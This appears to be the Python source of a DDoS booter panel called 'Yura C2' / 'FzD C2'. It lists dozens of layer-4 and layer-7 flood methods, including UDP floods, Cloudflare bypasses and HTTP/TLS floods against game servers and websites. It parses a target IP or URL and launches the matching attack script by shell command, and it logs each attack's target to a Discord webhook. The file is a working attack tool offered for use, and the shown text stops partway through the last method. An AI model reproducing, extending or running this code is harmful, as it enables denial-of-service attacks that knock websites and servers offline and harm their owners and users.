import socket
import os
import requests
import random
import getpass
import time
import sys
import json
import platform

def send_discord_webhook(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
      
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys) 

def si():
    print(f"         \x1b]2;Yura C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def ports():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3)    
    si()
    print(f'''
                            ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► 21 - SFTP        ║ L ║  ► 25 - SMTP        ║ L ║  ► 69 - TFTP        ║
             ║  ► 22 - SSH         ║   ║  ► 53 - DNS         ║   ║  ► 80 - HTTP        ║
             ║  ► 23 - TELNET      ║   ║  ► 25 - EMPTY       ║   ║  ► 443 - HTTPS      ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩═══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► 3074 - XBOX       ║ L ║  ► 5060 - RIP       ║ L ║  ►                  ║
             ║  ► 5060 - PLAYSTAT   ║   ║  ► 30120 - FIVEM    ║   ║  ►                  ║
             ║  ► 25565 - MINECRAFT ║   ║  ►                  ║   ║  ►                  ║
             ╚══════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')

def layer7():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3)    
    si()
    print(f'''
                              ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► http-raw         ║ L ║  ► http-rand        ║ L ║  ► mix              ║ ► http-ez
             ║  ► http-socket      ║   ║  ► cf-bypass        ║   ║  ► cf-pro           ║
             ║  ► ovh              ║   ║  ► cf-socket        ║   ║  ► httpflood        ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║
             ║  ► hyper            ║   ║  ► killer           ║   ║  ► tlsvip           ║
             ║  ► slow             ║   ║  ► flood            ║   ║  ► stress           ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')
    
def imYura():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3)    
    si()
    print(f'''
                              ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► https-storm      ║ L ║  ► http-requests    ║ L ║  ► http-high        ║
             ║  ► https-rand       ║   ║  ► http-vip         ║   ║  ► https-engine     ║
             ║  ► http-dstat       ║   ║  ► httpget          ║   ║  ►                  ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► https-crawlv2    ║ L ║  ► https-raw        ║ L ║  ► crash-vip        ║
             ║  ► https-crawl      ║   ║  ► https-get        ║   ║  ► yura-vip         ║
             ║  ► http-nullv2      ║   ║  ► kill-vip         ║   ║  ► tls-vip          ║
             ║  ► https-vip        ║   ║  ► ssh-vip          ║   ║  ► https-ua         ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝

''')


def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address
    
def layer4():
    clear()
    print(f''' connecting too Yura C2 Net Panel ''')
    time.sleep(3)    
    si()
    print(f'''
                                ▄· ▄▌▄• ▄▌▄▄▄   ▄▄▄·    ▐ ▄ ▄▄▄ .▄▄▄▄▄
                              ▐█▪██▌█▪██▌▀▄ █·▐█ ▀█   •█▌▐█▀▄.▀·•██
                              ▐█▌▐█▪█▌▐█▌▐▀▀▄ ▄█▀▀█   ▐█▐▐▌▐▀▀▪▄ ▐█.▪
                               ▐█▀·.▐█▄█▌▐█•█▌▐█ ▪▐▌  ██▐█▌▐█▄▄▌ ▐█▌·
                                ▀ •  ▀▀▀ .▀  ▀ ▀  ▀   ▀▀ █▪ ▀▀▀  ▀▀▀  
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► udp              ║   ║  ► stress           ║   ║  ► samplite         ║
             ║  ► samp             ║ L ║  ► home             ║ L ║  ► samppro          ║
             ║  ► udpbypass        ║   ║  ► god              ║   ║  ► sampvip          ║
             ║  ► destroy          ║   ║  ► soon             ║   ║  ► soon             ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝

''') 

def get_device_name():
    hostname = socket.gethostname()
    return hostname

def menu(): 
     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
     clear() 
     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
     print("") 
     print(""" 
         ██╗   ██╗██╗   ██╗██████╗  █████╗      ██████╗██████╗     ███╗   ██╗███████╗████████╗
         ╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗    ██╔════╝╚════██╗    ████╗  ██║██╔════╝╚══██╔══╝
          ╚████╔╝ ██║   ██║██████╔╝███████║    ██║      █████╔╝    ██╔██╗ ██║█████╗     ██║   
           ╚██╔╝  ██║   ██║██╔══██╗██╔══██║    ██║     ██╔═══╝     ██║╚██╗██║██╔══╝     ██║   
            ██║   ╚██████╔╝██║  ██║██║  ██║    ╚██████╗███████╗    ██║ ╚████║███████╗   ██║   
            ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝╚══════╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩═══════════════════════════════════════════════════╩══════════╗
             ║                         Welcome To Yura C2 Panel                        ║
             ║  This Tools Is Not For Sell , Only Use For Personal Use And 177 Members ║
             ║                               Crew Only                               ║
             ║                                                                         ║Dont Attack .edu And .gov
             ╚═════════════════════════════════════════════════════════════════════════╝
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩════╦══════════════════════════════════════════════╩══════════╗
             ║ ► CLEAR       ║  CLEAR OPTION                                           ║
             ║ ► TOOLS       ║  SHOW TOOLS                                             ║
             ║ ► SPECIAL     ║  SPECIAL METHOD                                         ║           
             ║ ► PORTS       ║  SHOW ALL PORT                                          ║
             ║ ► LAYER 4     ║  SHOW LAYER 4 METHOD                                    ║
             ║ ► LAYER 7     ║  SHOW LAYER 7 METHOD                                    ║
             ║ ► VIP        ║  SHOW VIP METHOD                                        ║
             ╚═══════════════╩═════════════════════════════════════════════════════════╝
 """)
 
def main():
    menu()
    while(True):
        cnc = input("""\x1b[38;2;0;2555mroot\u001b[35m@\x1b[38;2;0;2555mYuraC2~#""")
        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
            layer7()
        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif "ports" in cnc or "PORTS" in cnc or "ports" in cnc or "portss" in cnc:
            ports()
        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
            tools()
        elif "VIP" in cnc or "ViP" in cnc or "V1P" in cnc or "VIp" in cnc:
            imYura()

# LAYER 4 METHODS   

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nGOD\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')
                
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nDESTROY\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')
                
        elif "samppro" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-PRO\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-pro.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: samppro <ip> <port> <time> <thread>')
                print('Example: samppro 1.1.1.1 80 60 1000')                

        elif "sampvip" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-VIP\n---------------\nTarget: {ip}:{port}\nTime: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-vip.py {ip} {port} {time} {thread}')
            except IndexError:
                print('Usage: sampvip <ip> <port> <time> <thread>')
                print('Example: sampvip 1.1.1.1 80 60 1000')                
                
        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHOME\n---------------\nTarget: {ip}:{port}\nPsize: {psize}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nUDP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')
                
        elif "samplite" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP-LITE\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 samp-lite.py {ip} {port}')
            except IndexError:
                print('Usage: samplite <ip> <port>')
                print('Example: samplite 1.1.1.1 80')
# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSTRESS\n---------------\nTarget: {ip}:{port}\nConns: {conn}\nTime: {time}\nMode: {mode}\nOut: {out}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSAMP\n---------------\nTarget: {ip}:{port}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

# LAYER 7 METHODS
     
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSPOOF\n---------------\nTarget: {url}\nTime: {time}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nSLOW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHYPER\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-SOCKET\n---------------\nTarget: {url}\nPer: {per}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAW\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "tls" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nTLS\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node tls.js {url} {thread}')
            except IndexError:
                print('Usage: tls <url> <thread>')
                print('Example: tls http://example.org 120')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAND\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nCF BYPASS\n---------------\nTarget: {url}Time: {time}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nUAM BYPASS\n---------------\nTarget: {url}\nTime: {time}\nPer: {per}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nCRASH\n---------------\nTarget: {url}\nMethod: {method}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                device_name = platform.system()
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP FLOOD\n---------------\nTarget: {url}\nThread: {thread}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')
                
        elif "dandier" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nDANDIER\n---------------\nTarget: {url}\nThread: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'java dandier.java {url} {thread}')
            except IndexError:
                print('Usage: dandier <url> <threads>')
                print('Example: dandier http://example.com 15000')

        elif "ovh" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 start.py OVH {url} 4 {thread} http.txt 61 {time}')
            except IndexError:
                print('Usage: ovh <url> <thread> <time>')
                print('Example: ovh https://xnxx.com 800 60')
                
        elif "killer" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nKILLER\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'python3 start.py KILLER {url} 4 {thread} http.txt 61 {time}')
            except IndexError:
                print('Usage: killer <url> <thread> <time>')
                print('Example: killer https://xnxx.com 800 60')
                
        elif "mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nMIX\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node mix.js {url} {time}')
            except IndexError:
                print('Usage: mix <url> <time>')
                print('Example: mix https://xnxx.com 60')
                
        elif "http-ez" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node main.js {url} {time} {rate} {threads} {proxyFile} nil')
            except IndexError:
                print('Usage: http-ez <target> <time> <rate> <threads> <proxyFile> METHODS<GET/POST> <time>')
                print('Example: http-ez http://example.co 60 100 1000 proxies.txt')

# VVIP LAYER 7
        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')

        elif "http-request" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-request <url> <time>')
                print('Example: http-request http://example.org 60')

        elif "http-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTP.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "https-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "crash-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run CRASH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')
        
        elif "yura-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run LEVYX.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "socket-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SOCKET.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')

        elif "ssh-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SSH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: ssh-vip <url> METHODS<GET/POST>')
                print('Example: ssh-vip http://example.com GET')       
        elif "kill-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run KILL.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')                                           
        elif "tls-vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: tls-vip <url> METHODS<GET/POST>')
                print('Example: tls-vip http://example.com GET')        

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')
       
        elif "https-crawlv2" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-CRAWLV2.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-crawlv2 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: HTTPS-CRAWLV2 http://example.com 15000 get 60')

        elif "https-ua" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-SLOW-UA.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-ua <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-ua http://example.com 15000 get 60')

        elif "https-high" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-HIGH.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-high <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-high http://example.com 15000 get 60')

        elif "https-engine" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-ENGINE.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-engine <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-engine http://example.com 15000 get 60')
        
        elif "http-nullv2" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-NULLV2.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: http-nullv2 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: http-nullv2 http://example.com 15000 get 60')        
        elif "https-crawl" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-CRAWL.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-crawl <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-crawl http://example.com 15000 get 60')

        elif "https-get" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-GET.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-get <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-get http://example.com 15000 get 60')
        elif "https-raw" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTP-RAW.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: https-raw <url> <threads> METHODS<GET/POST> <time>')
                print('Example: https-raw http://example.com 15000 get 60')

        elif "https-rand" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run HTTPS-RAND.go {url} {thread} {method} {time} nil')
